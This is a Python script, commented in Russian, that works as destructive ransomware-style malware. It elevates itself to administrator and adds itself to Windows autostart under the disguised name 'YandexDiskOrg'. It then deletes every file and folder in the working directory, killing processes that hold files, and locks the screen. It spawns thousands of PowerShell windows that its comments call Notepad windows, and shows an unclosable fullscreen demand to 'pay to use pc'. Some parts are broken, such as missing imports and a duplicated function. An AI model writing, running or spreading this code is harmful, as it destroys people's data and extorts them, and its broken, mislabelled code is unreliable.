import os
import winreg
import sys
import shutil
import psutil
import platform
import tkinter as tk
from tkinter import messagebox

import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

    # Запуск скрипта от имени администратора
if sys.version_info[0] == 3:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)

# Импорт для работы с правами администратора (только для Windows)
if platform.system() == "Windows":
    import ctypes
    import win32com.shell.shell as shell
    import win32con

def is_admin():
    """Проверяет, запущен ли скрипт с правами администратора."""
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:  # Linux/macOS (предполагаем, что root)
        return os.geteuid() == 0


def add_to_startup_windows(file_path, app_name):
    """Добавляет программу в автозапуск Windows через реестр."""
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Ошибка добавления в автозапуск: {e}")
        return False

script_path = os.path.abspath(__file__)  # Полный путь к текущему скрипту
app_name = "YandexDiskOrg"  # Название программы в автозапуске

if add_to_startup_windows(script_path, app_name):
    print("Программа успешно добавлена в автозапуск Windows.")
else:
    print("Не удалось добавить программу в автозапуск Windows.")


def request_admin_rights():
    """Запрашивает права администратора, если они отсутствуют (только для Windows)."""
    if platform.system() == "Windows":
        if not is_admin():
            # Показываем окно с запросом прав
            root = tk.Tk()
            root.withdraw()  # Скрываем главное окно tkinter

            result = messagebox.askyesno(
                "Требуются права администратора",
                "Для удаления некоторых файлов требуются права администратора.\n"
                "Разрешить программе выполнить действия от имени администратора?\n\n"
                "(Это необходимо для удаления файлов, которые могут быть заблокированы другими процессами,\n"
                "например, системными службами.)",
                icon='warning'
            )
            root.destroy()  # Закрываем окно

            if result:
                # Перезапускаем скрипт с правами администратора
                try:
                    script_path = os.path.abspath(sys.argv[0])
                    shell.ShellExecuteEx(
                        lpVerb='runas',
                        lpFile=sys.executable,
                        lpParameters=script_path,
                        show=win32con.SW_SHOWNORMAL
                    )
                    sys.exit(0)  # Закрываем текущий экземпляр скрипта
                except Exception as e:
                    print(f"Ошибка при запросе прав администратора: {e}")
                    messagebox.showerror("Ошибка", f"Не удалось получить права администратора: {e}")
                    return False  # Возвращаем False в случае ошибки

            else:
                print("Пользователь не предоставил права администратора.")
                messagebox.showinfo("Отмена", "Удаление файлов будет выполнено без прав администратора.\n"
                                    "Некоторые файлы могут не быть удалены.")
                return False # Пользователь отказался предоставить права
        return True # Права уже есть или были успешно получены
    else:
        #В Linux и macOS запросить пароль администратора через консоль
        print("Пожалуйста, запустите этот скрипт с правами администратора (sudo).")
        return True  # Предполагаем, что пользователь сам запустит скрипт с sudo
def block_screen():
    """ Блокирует экран в зависимости от операционной системы. """
    os_name = platform.system()
    if os_name == "Windows":
        os.system("rundll32.exe user32.dll,LockWorkStation") # Блокировка экрана в Windows
    elif os_name == "Linux":
        try:
            # Попытка использовать xdg-screensaver для блокировки (обычно установлен в DE)
            os.system("xdg-screensaver lock")
        except:
            try:
                #Попытка использовать gnome-screensaver
                os.system("gnome-screensaver-command -l")
            except:
                try:
                    #Попытка использовать kscreenlocker
                    os.system("qdbus org.kde.screensaver /ScreenSaver Lock")
                except:
                    print("Не удалось заблокировать экран. Необходимо установить xdg-screensaver, gnome-screensaver или kscreenlocker")
    elif os_name == "Darwin": # macOS
        os.system("/System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend")
    else:
        print(f"Блокировка экрана не поддерживается для операционной системы: {os_name}")

def kill_process_by_file(filepath):
    """ Пытается завершить процесс, использующий указанный файл. """
    for proc in psutil.process_iter(['pid', 'name', 'open_files']):
        try:
            for file in proc.info['open_files'] or []:
                if file.path == filepath:
                    print(f"Найден процесс {proc.info['name']} (PID: {proc.info['pid']}), использующий файл {filepath}. Попытка завершения.")
                    process = psutil.Process(proc.info['pid'])
                    process.kill()  # Завершаем процесс
                    process.wait() # Ждем завершения
                    print(f"Процесс {proc.info['name']} (PID: {proc.info['pid']}) завершен.")
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass # Пропускаем ошибки, если процесс уже завершился
    return False

def delete_all_files_except_script():
    """ Удаляет все файлы и поддиректории в текущей директории, кроме текущего исполняемого скрипта Python.
        Если файл не удаляется (например, занят другим процессом), пытается завершить процесс и повторить удаление.
    """
    script_path = os.path.abspath(sys.argv[0]) # Полный путь к текущему скрипту
    current_dir = os.getcwd() # Получаем текущую директорию
    unremoved = [] #Список неудаленных файлов и директорий

    for filename in os.listdir(current_dir):
        filepath = os.path.join(current_dir, filename) # Получаем абсолютный путь к элементу
        if filepath != script_path: # Проверяем, что это не текущий скрипт
            try:
                if os.path.isfile(filepath): # Проверяем, что это файл
                    os.remove(filepath) # Используем os.remove для удаления файла
                    print(f"Удален файл: {filepath}")
                elif os.path.isdir(filepath): # Проверяем, что это директория
                    shutil.rmtree(filepath) # Используем shutil.rmtree для удаления директории с содержимым
                    print(f"Удалена директория: {filepath}")
            except Exception as e:
                print(f"Ошибка при удалении {filepath}: {e}")
                unremoved.append(filepath) #Добавляем в список неудаленных

    #Попытка удалить неудаленные
    for filepath in unremoved:
        try:
            print(f"Попытка завершить процесс, использующий {filepath}")
            if kill_process_by_file(filepath):
                print(f"Процесс использующий файл {filepath} завершен")
                if os.path.isfile(filepath): # Проверяем, что это файл
                    os.remove(filepath) # Используем os.remove для удаления файла
                    print(f"Удален файл: {filepath} (после завершения процесса)")
                elif os.path.isdir(filepath): # Проверяем, что это директория
                    shutil.rmtree(filepath) # Используем shutil.rmtree для удаления директории с содержимым
                    print(f"Удалена директория: {filepath} (после завершения процесса)")
            else:
                print(f"Не удалось завершить процесс для {filepath}")
        except Exception as e:
            print(f"Ошибка при удалении {filepath} после завершения процесса: {e}")

    print("Удаление завершено.")

def show_unclosable_error():
    """Создаёт окно ошибки, которое нельзя закрыть, пока не введён пароль."""
    root = tk.Tk()
    root.title("Error 403")
    root.attributes("-fullscreen", True)  # Полноэкранный режим (обязательно)
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Блокировка закрытия
    
    # Делаем окно поверх всех остальных
    root.attributes("-topmost", True)
    
    # Выводим сообщение об ошибке
    messagebox.showerror(
        "Error connect to pc", 
        "Please pay to use pc: 9 001 210 329 430\n"
        "Enter code to connect:",
        parent=root
    )
    
    # Поле для ввода пароля
    password_label = tk.Label(root, text="Enter code:", font=("Arial", 16))
    password_label.pack(pady=20)
    
    password_entry = tk.Entry(root, show="", font=("Arial", 14))
    password_entry.pack(pady=10)
    
    # Кнопка "Разблокировать"
    
    def check_password():
        if password_entry.get() == "1":  # Здесь можно задать любой пароль
            root.destroy()  # Закрываем окно
        else:
            messagebox.showerror("Enter", "Try latter", parent=root)
    
    unlock_button = tk.Button(
        root, 
        text="", 
        command=check_password,
        font=("Arial", 14),
        bg="red",
        fg="white"
    )
    unlock_button.pack(pady=20)
    
    # Запускаем главный цикл
    root.mainloop()

def open_10000_notepads():
    """Открывает 10000 окон блокнота (Notepad)"""
    for _ in range(10000):
        subprocess.Popen(["powershell.exe"])
        time.sleep(1.4)

if __name__ == "__main__":
    #if request_admin_rights():  # Запрашиваем права администратора перед выполнением
      # Блокируем экран перед удалением
    delete_all_files_except_script()
    block_screen()
    open_10000_notepads()
    show_unclosable_error()
    
